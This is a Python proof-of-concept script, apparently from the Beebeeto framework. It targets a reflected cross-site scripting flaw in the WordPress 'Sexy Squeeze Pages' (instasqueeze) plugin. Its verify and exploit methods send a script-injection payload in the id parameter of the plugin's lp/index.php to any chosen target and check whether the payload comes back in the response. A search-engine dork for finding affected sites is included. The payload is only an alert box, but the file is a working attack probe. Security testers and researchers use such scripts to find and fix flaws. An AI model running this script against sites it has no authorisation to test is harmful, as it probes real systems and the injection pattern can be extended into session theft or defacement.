#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0176',
            'name': 'WordPress Sexy Squeeze Pages Plugin XSS漏洞 POC',
            'author': 'nick233',
            'create_date': '2014-12-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['*'],
            'type': 'Cross Site Scripting',
            'tag': ['WordPress插件漏洞', 'XSS漏洞', 'php'],
            'desc': '''
                    Cross site scripting has benn found on instasqueeze/lp/index.php
                    inurl:wp-content/plugins/instasqueeze
                    ''',
            'references': ['https://www.yascanner.com/#!/x/11200',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = '/wp-content/plugins/instasqueeze/lp/index.php?id="/><script>alert(233)</script>'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '"/><script>alert(233)</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())